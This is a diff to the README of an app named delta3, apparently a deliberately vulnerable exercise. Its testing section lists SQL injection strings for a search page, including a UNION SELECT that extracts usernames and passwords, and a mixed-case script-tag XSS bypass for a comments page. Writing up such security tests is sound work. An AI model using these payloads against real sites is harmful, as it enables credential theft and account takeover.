@@ -16,11 +16,10 @@ App name: delta3
 5. Run `pip install -r requirements.txt`
 
 
-
 ##Testing
 #####Sql injections for search page:
 1. `" OR 1=1;--`
-2. `" UNION SELECT * from delta_user;--`
+2. `" UNION ALL SELECT age, username, password FROM delta3_user;--`
 
 #####XSS for comments page:
 1. a variation of script tag, except for all lowercase (e.g., `<scRipt>...</scRipt>`)
